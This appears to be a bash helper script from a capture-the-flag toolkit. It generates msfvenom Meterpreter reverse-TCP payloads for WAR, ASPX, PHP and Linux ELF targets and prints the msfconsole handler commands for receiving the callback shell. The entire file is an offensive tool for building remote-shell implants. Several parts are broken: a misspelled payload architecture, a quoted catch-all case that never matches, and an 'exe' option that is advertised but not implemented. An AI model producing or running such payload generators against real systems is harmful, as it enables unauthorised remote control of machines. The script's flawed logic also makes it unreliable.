#!/bin/bash
function usage
{
  echo Usage: payload_type lport
  echo "Generates common msfvenon payloads for reverse and meterpreter shells"
  echo payload_type is linux/linux-x64/war/aspx/php/exe
}
function meterpreter_commands
{
cat <<-EOF
# setup meterpreter in msfconsole:


use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $1
run


EOF
}

source ctfenv.sh
TYPE=$1
LPORT=$2
if [ "$LPORT" == "" ]; then
	usage
	exit 1
fi


case "$TYPE" in
  "war")
    PAYLOAD=java/meterpreter/reverse_tcp
    FORMAT=war
    ;;
  "aspx")
    PAYLOAD=windows/meterpreter/reverse_tcp
    FORMAT=aspx
    ;;
  "php")
    PAYLOAD=php/meterpreter_reverse_tcp
    FORMAT=
    ;;
  "linux")
    PAYLOAD=linux_x86/meterpreter_reverse_tcp
    FORMAT=elf
    ;;
  "linux-x64")
    PAYLOAD=linux_x84/meterpreter_reverse_tcp
    FORMAT=elf
    ;;
  "*")
    usage
    exit 1
    ;;
esac
if [ "$FORMAT" == "" ]; then
 CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT"
else
 CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT"
fi
echo
echo msfvenom command:
echo $CMD
OUTFILE=/tmp/payload.$TYPE
$CMD > $OUTFILE
if [ "$?" != "0" ]; then
	echo $0: msfvenom failed.
	exit 1
fi

echo $OUTFILE created.
echo
meterpreter_commands $LPORT

